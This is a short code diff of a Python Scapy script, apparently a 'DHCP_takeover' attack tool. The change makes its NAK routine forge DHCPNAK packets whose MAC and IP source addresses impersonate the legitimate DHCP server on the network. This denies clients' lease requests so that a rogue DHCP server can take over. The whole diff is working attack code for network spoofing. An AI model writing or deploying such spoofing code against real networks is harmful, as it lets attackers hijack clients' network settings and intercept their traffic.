@@ -49,17 +49,22 @@ class DHCP_takeover:
     # Spoofing a DHCPNAK from a legit DHCP server when a DHCPREQUEST is send from the DHCP client.
     def nak_request(self, packet):
 
-        print "Spoofing DHCPNAK from %s / %s" % (self.other_dhcp_servers.keys()[0], self.other_dhcp_servers[self.other_dhcp_servers.keys()[0]])
+        # we are hereby handling the case where we detect one other dhcp server besides our own...
 
         dhcp_server_mac = self.other_dhcp_servers.keys()[0]
+        dhcp_server_ip  = self.other_dhcp_servers[self.other_dhcp_servers.keys()[0]]
+
+        print "Spoofing DHCPNAK from %s / %s" % (dhcp_server_mac, dhcp_server_ip)
 
 
-        nak = Ether(src=self.our_dhcp_server_mac, dst=packet[Ether].dst) / \
-            IP(src=self.our_dhcp_server_ip, dst=packet[IP].dst) / \
+        nak = Ether(src=dhcp_server_mac, dst=packet[Ether].dst) / \
+            IP(src=dhcp_server_ip, dst=packet[IP].dst) / \
             UDP(sport=67,dport=68) / \
             BOOTP(op=2, ciaddr=packet[IP].src, siaddr=packet[IP].dst, chaddr=packet[Ether].src, xid=packet[BOOTP].xid) / \
             DHCP(options=[('server_id', self.our_dhcp_server_ip),('message-type','nak'), ('end')])
 
+        print "sending NAK:"
+        nak.show()
         scapy.all.sendp(nak)
 
 
